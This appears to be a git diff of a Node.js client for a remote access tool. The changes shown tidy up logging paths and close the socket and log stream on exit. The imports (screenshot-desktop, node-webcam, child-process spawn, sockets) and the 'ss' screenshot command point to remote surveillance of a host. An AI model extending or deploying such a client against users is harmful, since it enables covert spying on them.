@@ -2,7 +2,8 @@ const { Socket } = require('node:net');
 const { platform, arch, version, hostname } = require('node:os');
 const { createHash, randomBytes, pbkdf2Sync, createCipheriv, createDecipheriv } = require('node:crypto');
 const { spawn } = require('node:child_process');
-const { createWriteStream, unlinkSync } = require('node:fs');
+const { join } = require('node:path');
+const { createWriteStream, unlinkSync, existsSync, mkdirSync } = require('node:fs');
 const screenshot = require('screenshot-desktop');
 const webcam = require( "node-webcam" );
 
@@ -36,12 +37,20 @@ process.on('SIGINT', () => {
     if (client) {
         client.destroy();
     }
+    if (logStream) {
+        logStream.end()
+    }
     process.exit(0);
 });
 
 // Create a writable stream for logging
 if (LOGGING) {
-    logStream = createWriteStream('logs\\client.log', { flags: 'a' });
+    const logDir = join(__dirname, 'logs');
+    const logFilePath = join(logDir, 'client.log');
+    if (!existsSync(logDir)) {
+        mkdirSync(logDir, { recursive: true });
+    }
+    logStream = createWriteStream(logFilePath, { flags: 'a' });
 }
 
 // log it
@@ -273,6 +282,12 @@ const parseAction = async (action) => {
             return;
         } else if (command === 'di') {
             exitProcess = true;
+            if (client) {
+                client.destroy();
+            }
+            if (logStream) {
+                logStream.end()
+            }
             process.exit(0);
         } else if (command === 'ss') {
             await runScreenShot();
